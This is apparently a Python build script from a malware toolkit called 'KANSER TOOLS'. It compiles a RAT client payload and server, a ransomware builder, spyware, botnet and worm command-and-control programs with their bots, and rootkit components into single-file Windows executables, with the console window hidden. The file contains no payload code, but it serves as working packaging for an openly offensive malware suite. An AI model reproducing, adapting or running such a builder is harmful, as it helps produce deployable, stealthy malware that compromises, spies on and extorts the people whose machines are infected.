#!/usr/bin/env python3
"""
KANSER TOOLS — One-Click EXE Builder
python build_all.py
"""
import os, sys, subprocess, shutil, platform

DIST = "dist"
BUILDS = {
    "KanserRAT_Server.exe":    ("rat/server.py", "RAT Server CLI"),
    "KanserRAT_Client.exe":    ("rat/client.py", "RAT Client Payload"),
    "KanserRansom.exe":        ("ransomware/builder.py", "Ransomware Builder"),
    "KanserSpy_Server.exe":    ("spyware/server.py", "Spyware Server CLI"),
    "KanserNet_C2.exe":        ("botnet/c2.py", "Botnet C2 CLI"),
    "KanserNet_Bot.exe":       ("botnet/bot.py", "Botnet Zombie"),
    "KanserWorm_C2.exe":       ("worm/c2.py", "Worm C2 CLI"),
    "KanserWorm_Bot.exe":      ("worm/core.py", "Worm Core"),
    "KanserRootKit_Server.exe":("rootkit/server.py", "Rootkit Server CLI"),
    "KanserRootKit_Bot.exe":   ("rootkit/core.py", "Rootkit Core"),
    "KanserSosyal.exe":        ("sosyal/server.py", "Social Farm CLI"),
}

def check_pyinstaller():
    try:
        subprocess.run(["pyinstaller", "--version"], capture_output=True, timeout=5)
        return True
    except:
        return False

def build_all():
    print("=" * 50)
    print("  KANSER TOOLS — EXE BUILDER v1.0")
    print("=" * 50)

    if not check_pyinstaller():
        print("\n[!] pyinstaller not found. Installing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)

    os.makedirs(DIST, exist_ok=True)
    total, built = len(BUILDS), 0

    for name, (src, desc) in BUILDS.items():
        if not os.path.exists(src):
            print(f"\n[SKIP] {name} — {src} not found")
            continue

        print(f"\n[BUILD] {name} ({desc})")
        name_no_ext = name.replace(".exe", "")

        try:
            subprocess.run([
                sys.executable, "-m", "PyInstaller",
                "--onefile", "--noconsole",
                "--name", name_no_ext,
                "--distpath", os.path.abspath(DIST),
                "--workpath", os.path.join("build", name_no_ext),
                "--specpath", os.path.join("build", name_no_ext),
                src
            ], check=True, timeout=120)
            built += 1
            print(f"  [OK] -> {DIST}/{name}")
        except subprocess.TimeoutExpired:
            print(f"  [TIMEOUT] {name} — took too long")
        except Exception as e:
            print(f"  [FAIL] {name} — {e}")

    # Cleanup
    for d in ["build"]:
        if os.path.exists(d):
            try: shutil.rmtree(d)
            except: pass

    print(f"\n{'═' * 50}")
    print(f"  DONE: {built}/{total} built -> {os.path.abspath(DIST)}/")
    print(f"{'═' * 50}")
    for name in BUILDS:
        path = os.path.join(DIST, name)
        if os.path.exists(path):
            size_kb = os.path.getsize(path) / 1024
            print(f"  {name:30s} {size_kb:8.0f} KB")

if __name__ == "__main__":
    build_all()
